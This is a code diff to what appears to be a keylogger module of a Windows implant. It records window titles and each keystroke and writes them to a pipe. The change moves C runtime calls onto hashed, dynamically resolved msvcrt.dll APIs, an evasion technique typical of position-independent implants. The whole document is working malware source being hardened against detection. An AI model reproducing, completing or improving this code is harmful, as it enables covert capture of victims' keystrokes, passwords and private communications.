@@ -173,17 +173,17 @@ VOID ProcessWindowTitle()
         Instance->Win32.GetWindowThreadProcessId(CurrentWindow, &ProcessId);
         if (!Instance->Win32.GetWindowTextW(CurrentWindow, Buffer, sizeof(Buffer)))
         {
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
+            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"(No Title)");
         }
 
         // check when ever the title has been changed.
-        if (wcsncmp(g_TitleBuffer, Buffer, wcslen(Buffer)) != 0)
+        if (Instance->Win32.wcsncmp(g_TitleBuffer, Buffer, Instance->Win32.wcslen(Buffer)) != 0)
         {
             memcpy(g_TitleBuffer, Buffer, sizeof(Buffer));
 
-            swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
+            Instance->Win32.swprintf(Title, sizeof(Title), L"\n\n[%ld] %ls\n", ProcessId, g_TitleBuffer);
 
-            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
+            if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Title, Instance->Win32.wcslen(Title) * sizeof(wchar_t), &BytesWritten, NULL))
             {
                 return;
             }
@@ -217,33 +217,33 @@ VOID ProcessKey(UINT Key)
             break;
 
         case VK_ESCAPE:
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
+            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[ESCAPE]");
             break;
 
         case VK_RETURN:
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
+            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[RETURN]");
             break;
 
         case VK_BACK:
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
+            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[BACK]");
             break;
 
         case VK_TAB:
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
+            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"[TAB]");
             break;
 
         case VK_SPACE:
-            swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
+            Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L" ");
             break;
         
         default:
             if (Instance->Win32.ToUnicode(Key, Instance->Win32.MapVirtualKeyW(Key, MAPVK_VK_TO_VSC), Keyboard, Unicode, 1, 0) > 0)
             {
-                swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
+                Instance->Win32.swprintf(Buffer, KEYLOG_BUFFER_LEN, L"%ls", Unicode);
             }
     }
 
-    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL)) 
+    if (!Instance->Win32.WriteFile(Instance->Pipe.Write, Buffer, Instance->Win32.wcslen(Buffer) * sizeof(WCHAR), &BytesWritten, NULL))
     {
         return;
     }
@@ -265,8 +265,14 @@ auto DECLFN LoadEssentials( INSTANCE* Instance ) -> VOID {
     UPTR Ntdll    = LoadModule( HashStr( "ntdll.dll" ) );
     UPTR Kernel32 = LoadModule( HashStr( "kernel32.dll" ) );
     UPTR User32 = LoadModule(HashStr("user32.dll"));
+    UPTR Msvcrt = LoadModule(HashStr("msvcrt.dll"));
 
     Instance->Win32.Ntdll = Ntdll;
+	Instance->Win32.Msvcrt = Msvcrt;
+
+	Instance->Win32.swprintf = (decltype(Instance->Win32.swprintf))LoadApi(Msvcrt, HashStr("swprintf"));
+	Instance->Win32.wcslen = (decltype(Instance->Win32.wcslen))LoadApi(Msvcrt, HashStr("wcslen"));
+	Instance->Win32.wcsncmp = (decltype(Instance->Win32.wcsncmp))LoadApi(Msvcrt, HashStr("wcsncmp"));
     
     Instance->Win32.DbgPrint = (decltype(Instance->Win32.DbgPrint))LoadApi(Ntdll, HashStr("DbgPrint"));
     Instance->Win32.LoadLibraryA = (decltype(Instance->Win32.LoadLibraryA))LoadApi(Kernel32, HashStr("LoadLibraryA"));
